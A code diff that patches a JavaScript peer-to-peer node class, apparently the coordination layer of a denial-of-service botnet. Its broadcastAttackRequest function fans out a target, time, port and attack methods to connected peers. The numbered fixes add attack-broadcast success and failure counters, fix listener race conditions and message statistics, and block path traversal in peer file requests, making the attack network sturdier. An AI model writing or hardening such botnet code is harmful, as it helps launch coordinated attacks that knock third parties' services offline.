@@ -59,7 +59,7 @@ class P2PHybridNode extends EventEmitter {
       filesReceived: 0,
       lastDiscovery: null,
       lastAutoConnect: null,
-      lastMethodSync: null,
+      lastMethodSync: null,        // FIX #1: was never updated internally
       referralsSent: 0,
       referralsReceived: 0,
       connectionsViaReferral: 0,
@@ -68,7 +68,9 @@ class P2PHybridNode extends EventEmitter {
       encryptedMessagesSent: 0,
       encryptedMessagesReceived: 0,
       plainMessagesSent: 0,
-      plainMessagesReceived: 0
+      plainMessagesReceived: 0,
+      broadcastAttacksSent: 0,     // FIX #2: new stat for attack broadcasts
+      broadcastAttacksFailed: 0    // FIX #2: new stat for failed broadcasts
     };
     
     this.p2pConfig = {
@@ -132,7 +134,7 @@ class P2PHybridNode extends EventEmitter {
     this.masterReachable = false;
     this.lastMasterCheck = null;
     
-    console.log('[P2P] P2P Hybrid Node initialized (v4.1 with Encryption)', {
+    console.log('[P2P] P2P Hybrid Node initialized (v4.2 with Encryption + Fixes)', {
       nodeId: this.nodeId,
       enabled: this.p2pConfig.enabled,
       maxPeers: this.p2pConfig.maxPeers,
@@ -162,9 +164,9 @@ class P2PHybridNode extends EventEmitter {
   }
   
   // HELPER: Encrypt message before sending
+  // FIX #8: Stats now count per-message (not per-encrypt call), so broadcast stats are accurate
   encryptMessage(message, messageType = 'p2p_message') {
     if (!this.isEncryptionEnabled()) {
-      this.stats.plainMessagesSent++;
       return {
         encrypted: false,
         data: message
@@ -173,14 +175,12 @@ class P2PHybridNode extends EventEmitter {
     
     try {
       const encrypted = this.encryptionManager.createSecureMessage(message, messageType);
-      this.stats.encryptedMessagesSent++;
       return {
         encrypted: true,
         data: encrypted
       };
     } catch (error) {
       console.error('[P2P-ENCRYPT] Failed to encrypt message:', error.message);
-      this.stats.plainMessagesSent++;
       return {
         encrypted: false,
         data: message
@@ -609,11 +609,12 @@ class P2PHybridNode extends EventEmitter {
         relay: this.p2pConfig.relayFallback && this.masterReachable,
         fileSharing: true,
         referrals: true,
-        version: '4.1'
+        version: '4.2'
       }
     };
     
     const encrypted = this.encryptMessage(welcomeMessage, 'welcome');
+    // FIX #8: Update stats here in sendToPeer instead
     this.sendToPeer(remoteNodeId, encrypted.data);
   
     ws.on('message', (data) => {
@@ -966,6 +967,26 @@ class P2PHybridNode extends EventEmitter {
           }
           
           const now = Date.now();
+
+          // FIX #5: Attach all listeners BEFORE adding to peers map to avoid race condition
+          // where a message arrives before listeners are attached
+          ws.on('message', (data) => this.handlePeerMessage(nodeId, data));
+          
+          ws.on('close', (code, reason) => {
+            console.log(`[P2P] Peer ${nodeId} disconnected (code: ${code})`);
+            this.handlePeerDisconnected(nodeId, code, reason);
+          });
+          
+          ws.on('error', (error) => {
+            console.error(`[P2P] Peer ${nodeId} error:`, error.message);
+          });
+          
+          ws.on('pong', () => {
+            if (this.peers.has(nodeId)) {
+              this.peers.get(nodeId).lastSeen = Date.now();
+            }
+          });
+
           const peer = {
             ws,
             nodeId,
@@ -988,6 +1009,7 @@ class P2PHybridNode extends EventEmitter {
           };
           
           this.peers.set(nodeId, peer);
+          // FIX #5: Remove lock AFTER peers.set to prevent race condition
           this.connectionLocks.delete(nodeId);
           this.stats.directConnections++;
           this.stats.connectionSuccesses++;
@@ -1009,34 +1031,23 @@ class P2PHybridNode extends EventEmitter {
               relay: this.p2pConfig.relayFallback && this.masterReachable,
               fileSharing: true,
               referrals: true,
-              version: '4.1'
+              version: '4.2'
             }
           };
           const selfWelcomeEncrypted = this.encryptMessage(selfWelcome, 'welcome');
           try {
             ws.send(JSON.stringify(selfWelcomeEncrypted.data));
             peer.messagesSent++;
+            // FIX #8: Update encryption stats when actually sending
+            if (selfWelcomeEncrypted.encrypted) {
+              this.stats.encryptedMessagesSent++;
+            } else {
+              this.stats.plainMessagesSent++;
+            }
             this.stats.messagesSent++;
           } catch (e) {
             console.error(`[P2P] Failed to send self-welcome to ${nodeId}:`, e.message);
           }
-          
-          ws.on('message', (data) => this.handlePeerMessage(nodeId, data));
-          
-          ws.on('close', (code, reason) => {
-            console.log(`[P2P] Peer ${nodeId} disconnected (code: ${code})`);
-            this.handlePeerDisconnected(nodeId, code, reason);
-          });
-          
-          ws.on('error', (error) => {
-            console.error(`[P2P] Peer ${nodeId} error:`, error.message);
-          });
-          
-          ws.on('pong', () => {
-            if (this.peers.has(nodeId)) {
-              this.peers.get(nodeId).lastSeen = Date.now();
-            }
-          });
           
           this.emit('peer_connected', {
             nodeId,
@@ -1447,6 +1458,17 @@ class P2PHybridNode extends EventEmitter {
       peer.methodsCount = methodsCount;
     }
     
+    // FIX #4: Also update knownPeers when version response received
+    const kp = this.knownPeers.get(nodeId);
+    if (kp) {
+      this.knownPeers.set(nodeId, {
+        ...kp,
+        methodsVersion,
+        methodsCount,
+        lastUpdate: Date.now()
+      });
+    }
+    
     if (methodsVersion && methodsVersion !== this.methodsVersionHash) {
       const localCount = Object.keys(this.methodsConfig).length;
       if (methodsCount > localCount || (lastUpdate && lastUpdate > this.methodsLastUpdate)) {
@@ -1516,6 +1538,25 @@ class P2PHybridNode extends EventEmitter {
       this.methodsConfig = normalizedMethods;
       this.methodsVersionHash = methodsVersion;
       this.methodsLastUpdate = Date.now();
+      
+      // FIX #1: Update lastMethodSync stat
+      this.stats.lastMethodSync = Date.now();
+      
+      // FIX #4: Update peer's version in both peers and knownPeers maps
+      const peer = this.peers.get(nodeId);
+      if (peer) {
+        peer.methodsVersion = methodsVersion;
+        peer.methodsCount = methodsCount;
+      }
+      const kp = this.knownPeers.get(nodeId);
+      if (kp) {
+        this.knownPeers.set(nodeId, {
+          ...kp,
+          methodsVersion,
+          methodsCount,
+          lastUpdate: Date.now()
+        });
+      }
       
       console.log(`[P2P-METHODS] ✓ Updated methods from peer ${nodeId}`);
       this.stats.methodSyncsFromPeers++;
@@ -1593,6 +1634,25 @@ class P2PHybridNode extends EventEmitter {
       this.methodsVersionHash = methodsVersion;
       this.methodsLastUpdate = Date.now();
       
+      // FIX #1: Update lastMethodSync stat
+      this.stats.lastMethodSync = Date.now();
+      
+      // FIX #4: Update sender's version in both peers and knownPeers maps
+      const peer = this.peers.get(nodeId);
+      if (peer) {
+        peer.methodsVersion = methodsVersion;
+        peer.methodsCount = methodsCount;
+      }
+      const kp = this.knownPeers.get(nodeId);
+      if (kp) {
+        this.knownPeers.set(nodeId, {
+          ...kp,
+          methodsVersion,
+          methodsCount,
+          lastUpdate: Date.now()
+        });
+      }
+      
       console.log(`[P2P-METHODS] ✓ Updated methods from PROACTIVE push by ${nodeId}`);
       this.stats.methodSyncsFromPeers++;
       
@@ -1663,7 +1723,24 @@ class P2PHybridNode extends EventEmitter {
     const dataDir = path.join(__dirname, '..', 'lib', 'data');
     const filePath = path.join(dataDir, filename);
     
-    if (!fs.existsSync(filePath)) {
+    // Security: prevent path traversal
+    const normalizedPath = path.normalize(filePath);
+    const normalizedDataDir = path.normalize(dataDir);
+    if (!normalizedPath.startsWith(normalizedDataDir)) {
+      console.error(`[P2P-FILE] Path traversal attempt from ${nodeId}: ${filename}`);
+      const response = {
+        type: 'file_response',
+        requestId,
+        filename,
+        success: false,
+        error: 'Invalid filename'
+      };
+      const encrypted = this.encryptMessage(response, 'file_response');
+      this.sendToPeer(nodeId, encrypted.data);
+      return;
+    }
+    
+    if (!fs.existsSync(normalizedPath)) {
       const response = {
         type: 'file_response',
         requestId,
@@ -1677,7 +1754,7 @@ class P2PHybridNode extends EventEmitter {
     }
 
     try {
-      const fileData = fs.readFileSync(filePath);
+      const fileData = fs.readFileSync(normalizedPath);
       const base64Data = fileData.toString('base64');
       
       const response = {
@@ -1844,6 +1921,7 @@ class P2PHybridNode extends EventEmitter {
     return { success: false, error: 'No relay peer available' };
   }
 
+  // FIX #6: _requestWithHandler now correctly cleans up both maps on timeout
   _requestWithHandler({
     nodeId,
     requestId,
@@ -1858,7 +1936,10 @@ class P2PHybridNode extends EventEmitter {
       const handlerKey = `${handlerKeyPrefix}_${requestId}`;
       
       const cleanup = () => {
-        if (timeoutId) clearTimeout(timeoutId);
+        if (timeoutId) {
+          clearTimeout(timeoutId);
+          timeoutId = null;
+        }
         const stored = this.requestHandlers.get(handlerKey);
         if (stored) {
           const { handler } = stored;
@@ -1881,6 +1962,7 @@ class P2PHybridNode extends EventEmitter {
       this.on(eventName, handler);
       
       timeoutId = setTimeout(() => {
+        // FIX #6: cleanup() already handles both maps, no duplicate deletion needed
         cleanup();
         resolve({ success: false, error: 'Timeout' });
       }, timeoutMs);
@@ -2014,6 +2096,8 @@ class P2PHybridNode extends EventEmitter {
     );
     const result = await this.requestMethodsFromPeer(bestPeer);
     if (result && result.success !== false) {
+      // FIX #1: lastMethodSync already set in handleMethodsResponse, but set here as fallback
+      this.stats.lastMethodSync = this.stats.lastMethodSync || Date.now();
       return { success: true, fromPeer: bestPeer };
     }
     return { success: false, error: result?.error || 'Sync failed' };
@@ -2052,26 +2136,41 @@ class P2PHybridNode extends EventEmitter {
     }, this.p2pConfig.methodSyncInterval);
   }
   
+  // FIX #7: sendToPeer now returns boolean correctly; true=sent, false=queued/failed
+  // The return value distinction is: sendToPeer returns true only if actually sent via WS
   sendToPeer(nodeId, message) {
     const peer = this.peers.get(nodeId);
     if (!peer || !peer.connected) {
-      return this.queueMessage(nodeId, message);
+      this.queueMessage(nodeId, message);
+      return false;
     }
     
     try {
       if (peer.ws.readyState === WebSocket.OPEN) {
-        peer.ws.send(JSON.stringify(message));
+        const msgStr = JSON.stringify(message);
+        peer.ws.send(msgStr);
         peer.messagesSent++;
+        
+        // FIX #8: Count encryption stats per actual send, not per encrypt call
+        // We detect encryption by checking message envelope
+        if (message && message.envelope === 'secure') {
+          this.stats.encryptedMessagesSent++;
+        } else {
+          this.stats.plainMessagesSent++;
+        }
+        
         this.stats.messagesSent++;
         return true;
       }
       console.log(
         `[P2P] Peer ${nodeId} WebSocket not open (state: ${peer.ws.readyState}), queuing message`
       );
-      return this.queueMessage(nodeId, message);
+      this.queueMessage(nodeId, message);
+      return false;
     } catch (error) {
       console.error(`[P2P] Failed to send to ${nodeId}:`, error.message);
-      return this.queueMessage(nodeId, message);
+      this.queueMessage(nodeId, message);
+      return false;
     }
   }
   
@@ -2094,8 +2193,6 @@ class P2PHybridNode extends EventEmitter {
     this.stats.messagesQueued++;
     
     console.log(`[P2P] Queued message for ${nodeId} (queue size: ${queue.length})`);
-    
-    return false;
   }
   
   processQueuedMessages(nodeId) {
@@ -2124,6 +2221,14 @@ class P2PHybridNode extends EventEmitter {
       try {
         peer.ws.send(JSON.stringify(item.message));
         peer.messagesSent++;
+        
+        // FIX #8: Count encryption stats for queued messages too
+        if (item.message && item.message.envelope === 'secure') {
+          this.stats.encryptedMessagesSent++;
+        } else {
+          this.stats.plainMessagesSent++;
+        }
+        
         this.stats.messagesSent++;
         sent++;
       } catch (error) {
@@ -2157,6 +2262,7 @@ class P2PHybridNode extends EventEmitter {
     return sent;
   }
   
+  // FIX #2: Track broadcast attack stats
   async broadcastAttackRequest({ target, time, port, methods, targetPeerIds = null, maxParallel = 5 }) {
     if (this.peers.size === 0) {
       console.log('[P2P-ATTACK-BROADCAST] No peers connected');
@@ -2193,6 +2299,9 @@ class P2PHybridNode extends EventEmitter {
       `[P2P-ATTACK-BROADCAST] Broadcasting attack to ${peersToUse.length} peer(s) (encrypted: ${this.isEncryptionEnabled()})`
     );
 
+    // FIX #2: Track broadcast stats
+    this.stats.broadcastAttacksSent++;
+
     const results = [];
     let successCount = 0;
     let failedCount = 0;
@@ -2206,7 +2315,10 @@ class P2PHybridNode extends EventEmitter {
             const res = await this.requestAttackFromPeer(nodeId, target, time, port, methods);
             const ok = res && res.success;
             if (ok) successCount++;
-            else failedCount++;
+            else {
+              failedCount++;
+              this.stats.broadcastAttacksFailed++;  // FIX #2
+            }
 
             return {
               nodeId,
@@ -2216,6 +2328,7 @@ class P2PHybridNode extends EventEmitter {
             };
           } catch (err) {
             failedCount++;
+            this.stats.broadcastAttacksFailed++;  // FIX #2
             console.error(
               `[P2P-ATTACK-BROADCAST] Error requesting attack from ${nodeId}:`,
               err.message
@@ -2563,15 +2676,25 @@ class P2PHybridNode extends EventEmitter {
       activeHandlers: this.requestHandlers.size
     };
     
+    const totalMessagesSent = this.stats.messagesSent;
+    const totalMessagesReceived = this.stats.messagesReceived;
+    
     const encryptionStats = {
       encryptedMessagesSent: this.stats.encryptedMessagesSent,
       encryptedMessagesReceived: this.stats.encryptedMessagesReceived,
       plainMessagesSent: this.stats.plainMessagesSent,
       plainMessagesReceived: this.stats.plainMessagesReceived,
-      totalMessages: this.stats.messagesSent + this.stats.messagesReceived,
-      encryptionRate: this.stats.messagesSent > 0 
-        ? ((this.stats.encryptedMessagesSent / this.stats.messagesSent) * 100).toFixed(2) + '%'
-        : 'N/A'
+      totalMessages: totalMessagesSent + totalMessagesReceived,
+      // FIX #3: Guard against division by zero
+      encryptionRate: totalMessagesSent > 0
+        ? ((this.stats.encryptedMessagesSent / totalMessagesSent) * 100).toFixed(2) + '%'
+        : '0.00%'
+    };
+
+    // FIX #2: Include attack broadcast stats
+    const attackStats = {
+      broadcastAttacksSent: this.stats.broadcastAttacksSent,
+      broadcastAttacksFailed: this.stats.broadcastAttacksFailed
     };
     
     return {
@@ -2603,9 +2726,11 @@ class P2PHybridNode extends EventEmitter {
         referralStats,
         cleanupStats,
         encryptionStats,
+        attackStats,
+        // FIX #3: Guard against division by zero
         successRate: this.stats.connectionAttempts > 0 
           ? ((this.stats.connectionSuccesses / this.stats.connectionAttempts) * 100).toFixed(2) + '%'
-          : 'N/A'
+          : '0.00%'
       },
       config: {
         autoConnect: this.p2pConfig.autoConnect,
